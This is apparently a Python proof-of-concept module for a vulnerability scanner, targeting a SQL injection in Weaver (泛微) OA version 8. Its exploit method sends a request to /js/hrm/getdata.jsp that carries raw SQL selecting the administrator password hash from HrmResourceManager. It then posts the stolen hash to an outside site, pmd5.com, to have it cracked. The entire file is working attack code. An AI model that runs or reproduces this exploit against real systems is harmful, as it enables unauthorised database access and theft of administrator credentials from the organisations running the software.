import pocs
from lib import config
import re
import requests
from bs4 import BeautifulSoup
import urllib3
from colorama import init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        super().__init__()
        self.poc_name='泛微v8sql注入'
        self.vul_name='泛微v8sql注入'
        self.vul_num=''
        self.app_name='泛微oa'
        self.app_version='v8'
        self.author='haochen'
        self.msg='存在sql注入漏洞'
        self.must_parameter={
            'target' : ''
        }

    def Md5(self,md5):
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}
        data = {
            '__VIEWSTATE': '/wEPDwUKMTM4NTE3OTkzOWRkP4hmXYtPPhcBjbupZdLOLfmeTK4=',
            '__VIEWSTATEGENERATOR': 'CA0B0334',
            '__EVENTVALIDATION': '/wEWAwK75ZuyDwLigPTXCQKU9f3vAheUenitfEuJ6eGUVe2GyFzb7HKC',
            'key': '{}'.format(md5),
            'jiemi': 'MD5解密'
        }
        url = "http://pmd5.com/"
        r = requests.post(url, headers=header, data=data)
        sd = r.content.decode('utf-8')
        esdf = BeautifulSoup(sd, 'html.parser')
        for l in esdf.find_all('em'):
            g = l.get_text()

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        att_msg={}
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        self.must_parameter = must_parameter
        head = config.Pack
        self.payload= "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
        if re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.payload
        try:
            yz = requests.get(target)
            if yz.status_code == 200:
                att_msg['status'] = 'success'
                att_msg['msg'] = '存在漏洞'
                md5 = yz.text
                self.Md5(md5)
            else:
                att_msg['status']='failed'
                att_msg['msg']='不存在漏洞，网站返回值为: '+str(yz.status_code) 
        except:
            att_msg['status']='error'
            att_msg['msg']='无法正确访问网站'
        return att_msg